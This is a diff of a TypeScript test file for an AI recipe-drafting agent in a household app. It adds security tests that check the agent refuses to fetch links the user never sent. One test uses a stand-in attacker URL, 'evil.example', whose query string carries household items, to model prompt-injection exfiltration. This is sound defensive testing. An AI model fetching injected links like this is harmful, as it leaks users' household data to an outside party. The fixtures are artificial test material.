@@ -1225,7 +1225,9 @@ describe('ai-agent: recipe drafts (spec 0067, REQ-010)', () => {
         },
       },
     });
-    const all = await events(await handler(send({ chatId: CHAT_ID, message: 'leg das an' }), deps));
+    const all = await events(
+      await handler(send({ chatId: CHAT_ID, message: `leg das an ${RECIPE_PAGE}` }), deps),
+    );
     const [extra] = extrasOf(all);
     expect(extra?.kind).toBe('recipe_draft');
     if (extra?.kind !== 'recipe_draft') return;
@@ -1250,7 +1252,9 @@ describe('ai-agent: recipe drafts (spec 0067, REQ-010)', () => {
         },
       },
     });
-    const all = await events(await handler(send({ chatId: CHAT_ID }), deps));
+    const all = await events(
+      await handler(send({ chatId: CHAT_ID, message: `${RECIPE_PAGE} anlegen` }), deps),
+    );
     expect(extrasOf(all)).toEqual([]);
     expect(calls(state, 'POST', DRAFT_MODEL)).toEqual([]);
     const output = JSON.parse(outputsOf(state, 1)[0]!.output!);
@@ -1313,6 +1317,54 @@ describe('ai-agent: recipe drafts (spec 0067, REQ-010)', () => {
     const [extra] = extrasOf(all);
     expect(extra?.kind === 'recipe_draft' && extra.reply.draft.servings).toBe(4);
     expect(JSON.stringify(modelInput(state))).toContain('aktuelles_rezept_nur_daten');
+  });
+
+  it('security check 28.11.: a link the person never sent is not fetched (injection carrying data out)', async () => {
+    const evil = 'https://evil.example/r?l=Milch,Eier';
+    const { deps, state } = setup({
+      state: {
+        stream: toolTurn([
+          { name: 'draft_recipe', callId: 'call_d', args: draftArgs({ links: [evil] }) },
+        ]),
+        routes: {
+          [evil]: page('<html><body><p>200 g rote Linsen</p></body></html>'),
+          [DRAFT_MODEL]: () => foundryReply(dalDraft),
+        },
+      },
+    });
+    const all = await events(await handler(send({ chatId: CHAT_ID, message: 'leg das an' }), deps));
+    expect(extrasOf(all)).toEqual([]);
+    expect(calls(state, 'GET', evil)).toEqual([]);
+    expect(calls(state, 'POST', DRAFT_MODEL)).toEqual([]);
+    const output = JSON.parse(outputsOf(state, 1)[0]!.output!);
+    expect(output).toMatchObject({ error: 'link_not_from_person', urls: [evil] });
+  });
+
+  it('security check 28.11.: a link from an earlier message of the person in this chat is read', async () => {
+    const { deps, state } = setup({
+      state: {
+        conversations: {
+          conv_old: {
+            metadata: { household_id: HOUSEHOLD_ID },
+            items: [
+              {
+                type: 'message',
+                role: 'user',
+                content: [{ type: 'input_text', text: `Schau mal: ${RECIPE_PAGE}.` }],
+              },
+            ],
+          },
+        },
+        stream: toolTurn([{ name: 'draft_recipe', callId: 'call_d', args: draftArgs() }]),
+        routes: {
+          [RECIPE_PAGE]: page('<html><body><p>200 g rote Linsen</p></body></html>'),
+          [DRAFT_MODEL]: () => foundryReply(dalDraft),
+        },
+      },
+    });
+    const all = await events(await handler(send({ chatId: CHAT_ID, message: 'leg das an' }), deps));
+    expect(extrasOf(all)[0]?.kind).toBe('recipe_draft');
+    expect(calls(state, 'GET', RECIPE_PAGE)).toHaveLength(1);
   });
 
   it('refine without a draft in the chat tells the model', async () => {
@@ -1447,13 +1499,13 @@ describe('ai-agent: card websites (security check 27.11., spec 0067)', () => {
     expect(cards?.type === 'cards' && cards.cards[0]?.websiteUrl).toBeUndefined();
   });
 
-  it('without household tools the model’s https website stays', async () => {
+  it('also without household tools in this answer the model’s website never stays (security check 28.11.)', async () => {
+    // Household data of an earlier answer is still in the conversation.
     const { deps } = setup();
     const all = await events(await handler(send({ chatId: CHAT_ID }), deps));
     const cards = all.find((event) => event.type === 'cards');
-    expect(cards?.type === 'cards' && cards.cards[0]?.websiteUrl).toBe(
-      'https://crackersberlin.com',
-    );
+    expect(cards?.type === 'cards' && cards.cards[0]?.name).toBe('Crackers');
+    expect(cards?.type === 'cards' && cards.cards[0]?.websiteUrl).toBeUndefined();
   });
 });
 
@@ -1691,7 +1743,9 @@ describe('ai-agent: a draft of something the household has (preview 28.11., dupl
         },
       },
     });
-    const all = await events(await handler(send({ chatId: CHAT_ID }), deps));
+    const all = await events(
+      await handler(send({ chatId: CHAT_ID, message: `leg ${RECIPE_PAGE} an` }), deps),
+    );
     const output = JSON.parse(outputsOf(state, 1)[0]!.output!);
     expect(output.existing).toEqual([{ id: LASAGNE, title: 'Linsen Dal' }]);
     expect(extrasOf(all).map((extra) => extra.kind)).toEqual(['recipe_draft', 'entities']);
